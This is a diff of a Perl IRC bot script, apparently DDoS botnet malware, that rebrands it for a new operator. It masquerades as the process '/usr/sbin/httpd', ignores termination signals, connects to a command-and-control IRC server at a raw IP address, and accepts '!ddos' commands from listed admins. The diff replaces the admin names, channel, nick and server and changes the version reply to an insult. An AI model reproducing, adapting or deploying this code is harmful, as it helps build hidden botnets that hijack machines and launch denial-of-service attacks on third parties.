@@ -2,14 +2,14 @@
 use HTTP::Request;
 use LWP::UserAgent;
 my $processo = '/usr/sbin/httpd';
-my @adms      = ("InTrUsIoN","zero89","^DoCtOr^");
-my @canais    = ("#funcky");
-my $nick      = 'DDoS';
-my $ircname   = 'DDoS';
-chop( my $realname = `whoami` );
-my $servidor= 'irc.virtual-irc.org' unless $servidor;
+my @adms      = ("catalin","catalin","catalin");
+my @canais    = ("#Catalin");
+my $nick      = 'catalin';
+my $ircname   = 'BOT';
+chop( my $realname = `bot` );
+my $servidor= '92.63.57.110' unless $servidor;
 my $porta= '6667';
-my $VERSAO   = 'DDoS BoT';
+my $VERSAO   = 'BOT';
 $SIG{'INT'}  = 'IGNORE';
 $SIG{'HUP'}  = 'IGNORE';
 $SIG{'TERM'} = 'IGNORE';
@@ -190,7 +190,7 @@ sub parse {
         my $onde     = $4;
         my $args     = $5;
         if ( $args =~ /^\001VERSION\001$/ ) {
-            notice( "$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001" );
+            notice( "$pn", "\001hai la tata nemernicule\001" );
         }
         if ( grep { $_ =~ /^\Q$pn\E$/i } @adms ) {
         if ( $args =~ /^(\Q$meunick\E|\!ddos)\s+(.*)/ ) {
